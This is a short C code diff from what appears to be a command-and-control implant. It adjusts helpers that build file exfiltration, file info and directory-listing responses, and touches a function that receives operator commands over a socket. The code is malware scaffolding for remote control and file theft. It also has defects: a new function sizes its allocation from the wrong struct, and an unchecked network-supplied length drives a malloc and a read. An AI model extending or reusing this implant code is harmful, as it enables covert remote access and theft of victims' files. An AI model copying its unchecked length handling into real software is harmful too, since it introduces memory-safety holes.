@@ -8,7 +8,7 @@
 struct exf_res *exf_res_init(uint32_t file_size, enum file_status status)
 {
     struct exf_res *res;
-    uint32_t len = sizeof(struct exf_res) + file_size;
+    uint64_t len = sizeof(struct exf_res) + file_size;
 
     res = (struct exf_res *)malloc(len);
     res->header.type = EXF_FILE;
@@ -22,10 +22,23 @@ struct exf_res *exf_res_init(uint32_t file_size, enum file_status status)
 struct inf_res *inf_res_init(enum file_status status)
 {
     struct inf_res *res;
-    uint32_t len = sizeof(struct inf_res);
+    uint64_t len = sizeof(struct inf_res);
 
     res = (struct inf_res *)malloc(len);
     res->header.type = INF_FILE;
+    res->header.res_len = len;
+    res->status = status;
+
+    return res;
+}
+
+struct dir_res *dir_res_init(enum file_status status)
+{
+    struct dir_res *res;
+    uint64_t len = sizeof(struct inf_res);
+
+    res = (struct dir_res *)malloc(len);
+    res->header.type = READ_DIR;
     res->header.res_len = len;
     res->status = status;
 
@@ -45,7 +58,7 @@ struct c2_req *receive_command(int sockfd)
     req = malloc(req_tmp.req_len);
 
     memset(req, 0, req_tmp.req_len);
-    memcpy(req, &req_tmp, sizeof(req_tmp));
+    memcpy(req, &req_tmp, sizeof(struct c2_req));
 
     read(sockfd, (void *)req + sizeof(struct c2_req), req->req_len - sizeof(struct c2_req));
 
